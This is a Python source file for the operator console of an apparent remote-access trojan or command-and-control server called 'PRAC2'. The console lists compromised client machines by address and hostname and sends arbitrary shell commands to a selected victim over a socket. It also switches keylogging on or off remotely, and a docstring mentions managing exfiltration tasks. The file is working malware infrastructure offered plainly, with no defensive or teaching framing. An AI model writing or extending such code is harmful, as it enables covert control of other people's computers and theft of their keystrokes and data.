import logging
from server_code.client_management import ClientManagement
from server_code.command_handler import CommandHandler


class OperatorShell:
    """
    Handles operator-specific interactions, such as managing client sessions,
    running commands on clients, and managing exfiltration tasks.
    """

    def __init__(self, client_manager, main_server):
        self.client_manager = client_manager
        self.main_server = main_server
        self.command_handler = CommandHandler(client_manager, self, main_server)
        self.active_client_id = None  # Tracks the currently connected client

    def launch(self):
        """
        Launches the operator shell for interacting with clients.
        """
        logging.info("[OperatorShell] Operator shell started.")
        print(self.get_operator_banner())

        while True:
            try:
                command = input("operator> ").strip()
                if not command:
                    continue

                if command.lower() in ["exit", "quit"]:
                    print("[OperatorShell] Exiting operator shell.")
                    break

                self.handle_command(command)
            except KeyboardInterrupt:
                print("\n[OperatorShell] Operator shell interrupted. Exiting.")
                break
            except Exception as e:
                logging.error(f"[OperatorShell] Error in operator shell: {e}")

    def get_operator_banner(self):
        """
        Returns the banner for the operator shell.
        """
        return (
            "Welcome to the PRAC2 Operator Shell.\n"
            "Type 'help' for a list of commands.\n"
        )

    def handle_command(self, command: str):
        """
        Processes operator-specific commands.
        """
        parts = command.split()
        cmd_name = parts[0].lower()

        if cmd_name == "help":
            self.print_help()
        elif cmd_name == "list":
            self.list_clients()
        elif cmd_name == "connect" and len(parts) == 2:
            self.connect_to_client(parts[1])
        elif cmd_name == "run" and len(parts) > 1:
            self.run_command(" ".join(parts[1:]))
        elif cmd_name == "keylogging" and len(parts) == 2:
            self.handle_keylogging(parts[1])
        else:
            print(f"Unknown command: {cmd_name}. Type 'help' for assistance.")

    def print_help(self):
        """
        Prints available operator commands.
        """
        print(
            "Operator Commands:\n"
            "  help                  - Show this help message.\n"
            "  list                  - List active client connections.\n"
            "  connect <client_id>   - Connect to a specific client.\n"
            "  run <command>         - Run a command on the connected client.\n"
            "  keylogging <status>   - Enable/disable keylogging for a client.\n"
            "  exit / quit           - Exit the operator shell."
        )

    def list_clients(self):
        """
        List active clients with numeric IDs for easier connection.
        """
        clients = self.client_manager.get_active_clients()
        if not clients:
            print("No active clients.")
            return
        print("Active Clients:")
        for numeric_id, client_info in clients.items():
            print(
                f"  ID: {numeric_id}, Address: {client_info['address']}, "
                f"Hostname: {client_info['hostname']}"
            )

    def connect_to_client(self, numeric_id):
        """
        Connects to a specific client using its numeric ID.
        """
        try:
            numeric_id = int(numeric_id)
            if not self.client_manager.client_exists(numeric_id):
                print(f"Client {numeric_id} does not exist.")
                return
            self.active_client_id = numeric_id
            print(f"Connected to client {numeric_id}. Use 'run <command>' to execute commands.")
        except ValueError:
            print("Invalid client ID. Use a numeric value.")

    def run_command(self, command: str):
        """
        Sends a command to the connected client and displays the output.
        """
        if not self.active_client_id:
            print("No client connected. Use 'connect <client_id>' first.")
            return

        client_socket = self.client_manager.clients[self.active_client_id]["connection"]

        try:
            # Send command to client
            client_socket.sendall(command.encode("utf-8"))

            # Receive response
            response = ""
            while True:
                chunk = client_socket.recv(4096).decode(errors="replace")
                if "[END_OF_RESPONSE]" in chunk:
                    response += chunk.replace("[END_OF_RESPONSE]", "")
                    break
                response += chunk

            print(f"Client {self.active_client_id} Response:\n{response.strip()}")
        except Exception as e:
            print(f"Failed to execute command on client {self.active_client_id}: {e}")
            logging.error(f"[OperatorShell] Error running command on client {self.active_client_id}: {e}")

    def handle_keylogging(self, status: str):
        """
        Manages keylogging for the connected client.
        """
        if not self.active_client_id:
            print("No client connected. Use 'connect <client_id>' first.")
            return

        if status.lower() == "enable":
            success = self.client_manager.enable_keylogging(self.active_client_id)
            if success:
                print(f"Keylogging enabled for client {self.active_client_id}.")
            else:
                print(f"Failed to enable keylogging for client {self.active_client_id}.")
        elif status.lower() == "disable":
            success = self.client_manager.disable_keylogging(self.active_client_id)
            if success:
                print(f"Keylogging disabled for client {self.active_client_id}.")
            else:
                print(f"Failed to disable keylogging for client {self.active_client_id}.")
        else:
            print("Invalid keylogging status. Use 'enable' or 'disable'.")